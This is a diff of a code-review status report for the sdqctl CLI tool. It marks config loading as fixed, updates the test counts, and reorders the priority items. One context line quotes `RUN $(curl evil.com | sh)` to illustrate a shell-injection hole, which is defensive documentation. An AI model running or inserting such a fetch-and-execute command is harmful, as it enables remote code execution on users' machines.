@@ -2,11 +2,23 @@
 
 **Analysis Date:** 2026-01-21  
 **Git Branch:** main  
-**Test Status:** 319/319 passing (109 original + 87 CLI/command + 25 copilot + 21 status + 28 logging + 28 progress + 21 registry tests)
+**Test Status:** 342/342 passing (319 original + 23 config tests)
 
 ---
 
 ## Completed Items (2026-01-21)
+
+### ✅ P0-1: Config File Loading - COMPLETED
+- Added `sdqctl/core/config.py` with `load_config()` function
+- Searches: cwd → parent dirs (stops at git root) → ~/.sdqctl.yaml
+- Config values provide defaults for adapter, model, context_limit
+- ConversationFile now uses `default_factory` to load config-based defaults
+- Added `tests/test_config.py` with 23 tests covering:
+  - Config parsing from YAML
+  - Search path resolution
+  - Caching behavior
+  - Helper functions
+  - Integration with ConversationFile
 
 ### ✅ P0-3: CLI Integration Tests - COMPLETED
 - Added `tests/test_cli.py` with 22 tests covering CLI entry points
@@ -82,29 +94,7 @@
 
 ## Next Three Highest Priority Work Areas
 
-### 1. Config File Loading Not Implemented (P0)
-**Location:** `sdqctl/cli.py` lines 83-127 (init) vs missing loader
-
-The `sdqctl init` command creates a `.sdqctl.yaml` config file with defaults for adapter, model, context limits, etc. However, **no code loads or uses this config file**. Users configure defaults that are silently ignored.
-
-**Evidence:**
-- `cli.py` lines 108-126: Config template written with `defaults.adapter`, `defaults.model`
-- No `load_config()` or config parsing anywhere in codebase
-- Commands directly use hardcoded defaults (e.g., `model="gpt-4"` in `conversation.py` line 169)
-
-**Fix:** Add config loading in CLI startup or command initialization:
-```python
-# sdqctl/core/config.py
-def load_config(path: Path = None) -> dict:
-    """Load .sdqctl.yaml from project root or home."""
-    search_paths = [Path.cwd() / ".sdqctl.yaml", Path.home() / ".sdqctl.yaml"]
-    for p in search_paths:
-        if p.exists():
-            return yaml.safe_load(p.read_text())
-    return {}
-```
-
-### 2. Shell Injection Vulnerability in RUN Directive (P0)
+### 1. Shell Injection Vulnerability in RUN Directive (P0)
 **Location:** `sdqctl/commands/run.py` lines 444-451
 
 The RUN directive uses `shell=True` with user-provided content, creating a shell injection risk:
@@ -128,7 +118,7 @@ If a workflow file contains `RUN $(curl evil.com | sh)` or similar, it executes 
 2. Add explicit `ALLOW-SHELL` directive to enable shell mode
 3. Add sandboxing/validation for RUN commands
 
-### 3. Resource Leak in Error Paths (P1)
+### 2. Resource Leak in Error Paths (P1)
 **Location:** `sdqctl/commands/run.py` lines 287-510
 
 The adapter start/stop pattern has gaps in error handling where sessions may not be destroyed:
@@ -167,19 +157,23 @@ except Exception:
     raise
 ```
 
+### 3. No Retry Logic (P1)
+**Files:** `adapters/copilot.py`, `commands/run.py`  
+**Issue:** Network errors and transient failures cause immediate failure
+
+**Recommendation:** Add configurable retry with exponential backoff.
+
 ---
 
 ## Detailed Findings
 
 ### P0 - Critical Issues
 
-#### P0-1: Config File Not Loaded
-**File:** `sdqctl/cli.py` lines 83-127 vs missing loader  
+#### P0-1: Config File Not Loaded ✅ FIXED
+**File:** `sdqctl/cli.py` lines 83-127 vs `sdqctl/core/config.py`  
 **Issue:** Config file created but never loaded
 
-The init command creates `.sdqctl.yaml` with settings like `defaults.adapter: copilot` but no code reads this file. Every command uses hardcoded defaults instead.
-
-**Recommendation:** Implement config loader and wire into CLI startup.
+**Resolution:** Added `sdqctl/core/config.py` with full config loading. ConversationFile now uses config defaults.
 
 #### P0-2: Shell Injection in RUN Directive
 **File:** `sdqctl/commands/run.py` lines 444-451  
@@ -490,13 +484,11 @@ timeout=60,  # Default timeout
 
 **Recommendation:** Add optional metrics output (timings, token usage, etc.)
 
-#### F3: No Config File Support (P1)
-**File:** `sdqctl/cli.py`  
+#### F3: No Config File Support ✅ FIXED
+**File:** `sdqctl/core/config.py`  
 **Issue:** `sdqctl init` creates `.sdqctl.yaml` but it's not loaded
 
-The init command (lines 83-176) creates a config file template, but no code loads/uses it.
-
-**Recommendation:** Implement config file loading in CLI startup.
+**Resolution:** Implemented full config loading with search paths (cwd → parents → home).
 
 ---
 
